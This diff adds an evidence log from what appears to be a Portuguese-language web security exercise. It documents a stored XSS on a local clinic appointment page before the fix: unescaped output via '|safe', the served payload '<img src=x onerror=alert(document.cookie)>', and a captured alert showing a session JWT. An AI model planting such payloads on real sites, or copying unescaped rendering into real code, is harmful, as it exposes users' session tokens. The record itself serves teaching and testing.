@@ -1,0 +1,13 @@
+# Evidência : V3 XSS stored (ANTES): página de detalhe renderiza <img onerror> sem escape (|safe); print captura o alert com document.cookie
+# Exercício : ex09   Rubrica(s): R16
+# Data      : 2026-09-28 09:35:30 -0400
+# Commit    : 104f916 (ex08-vulneravel)
+# Comando   : TC=$(scripts/token.sh dra_carla); echo '--- HTML servido (tag NÃO escapada):'; curl -s --cookie "access_token=$TC" localhost:8000/recepcao/consultas/1 | grep -i 'class="obs"'; echo '--- print (o Playwright captura o evento dialog):'; scripts/.venv-tools/bin/python scripts/print_tela.py http://localhost:8000/recepcao/consultas/1 evidencias/ex09/04_V3_xss_antes.png --cookie access_token=$TC
+# ------------------------------------------------------------------
+--- HTML servido (tag NÃO escapada):
+<div class="obs"><img src=x onerror=alert(document.cookie)></div>
+--- print (o Playwright captura o evento dialog):
+DIALOG: alert access_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJkcmFfY2FybGEiLCJpc3MiOiJjb25zdWx0YXMtYXBpIiwiYXVkIjoiYXBpLWNvbnN1bHRhcyIsImlhdCI6MTc5MDYwMjUzMCwiZXhwIjoxNzkwNjAzNDMwLCJwYXBlbCI6InByb2Zpc3Npb25hbCIsInNjb3BlIjoiY29uc3VsdGFzOnJlYWQgY29uc3VsdGFzOndyaXRlIiwicHJvZmlzc2lvbmFsX2lkIjoxfQ.bqkwaRDZGyMo8SG9TYmxv2gTS1cvkLv4ug6_v5Nu4dM
+HTTP 200 http://localhost:8000/recepcao/consultas/1 -> evidencias/ex09/04_V3_xss_antes.png; dialogs=1
+# ------------------------------------------------------------------
+# exit code : 0
